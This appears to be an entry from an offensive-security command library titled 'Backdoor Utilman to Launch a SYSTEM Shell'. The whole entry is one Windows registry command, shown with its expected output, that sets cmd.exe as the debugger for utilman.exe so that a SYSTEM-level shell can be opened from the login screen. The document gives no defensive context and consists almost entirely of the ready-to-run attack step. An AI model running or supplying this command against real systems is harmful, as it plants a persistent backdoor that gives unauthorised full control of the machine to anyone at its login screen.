---
id: 08706f60-1ff4-4d38-86f3-16b2865b6b8d
name: Backdoor Utilman to Launch a SYSTEM Shell
type: command
executor: command_prompt
data: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution
  Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
output: 'C:\Windows\system32>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
  File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe"
  /f

  The operation completed successfully.'
created_at: '2020-04-03T08:54:04.305583+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Backdoor Utilman to Launch a SYSTEM Shell

```command_prompt
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
```

## Expected Output

```
C:\Windows\system32>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
The operation completed successfully.
```


